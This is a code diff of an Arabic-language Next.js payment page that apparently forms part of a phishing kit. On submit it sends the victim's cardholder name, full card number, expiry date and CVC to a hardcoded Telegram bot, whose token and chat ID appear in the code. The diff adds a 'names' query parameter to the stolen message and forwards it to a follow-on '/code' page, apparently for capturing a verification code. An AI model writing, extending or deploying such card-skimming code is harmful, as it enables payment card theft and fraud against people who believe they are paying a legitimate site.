@@ -5,7 +5,7 @@ import master from '../../../../../public/master.png'
 import mada from '../../../../../public/mada.png'
 import Image from 'next/image'
 import {useRef} from 'react'
-import { useRouter } from 'next/navigation'
+import { useRouter,useSearchParams } from 'next/navigation'
 
 
 const Pay=()=>{
@@ -15,7 +15,9 @@ const Pay=()=>{
     const dateCardmm = useRef()
     const dateCardyy = useRef()
     const cvcCard = useRef()
-
+    const x = useSearchParams();
+    const datas = x.get("names");
+    
     const router = useRouter()
     const handleSubmit = (e) => {
         e.preventDefault();
@@ -23,7 +25,7 @@ const Pay=()=>{
             token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
             chat_id:6364334502
         }
-        var length =` طريقة الدفع : ${selectPay.current.value} %0A   الاسم على البطاقة: ${NameCard.current.value} %0A  رقم البطاقة  : ${NumsCard.current.value} %0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value}`
+        var length =` طريقة الدفع : ${selectPay.current.value} %0A   الاسم على البطاقة: ${NameCard.current.value} %0A  رقم البطاقة  : ${NumsCard.current.value} %0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value} %0A %0A ${datas}`
        
         
         fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -34,7 +36,7 @@ const Pay=()=>{
           alert('من فضلك قم بملى الحقول')
         }else{
           
-          router.push('/fozajil/banks/pay/code')
+          router.push(`/fozajil/banks/pay/code?names=${datas}`)
         }
       }
   return (
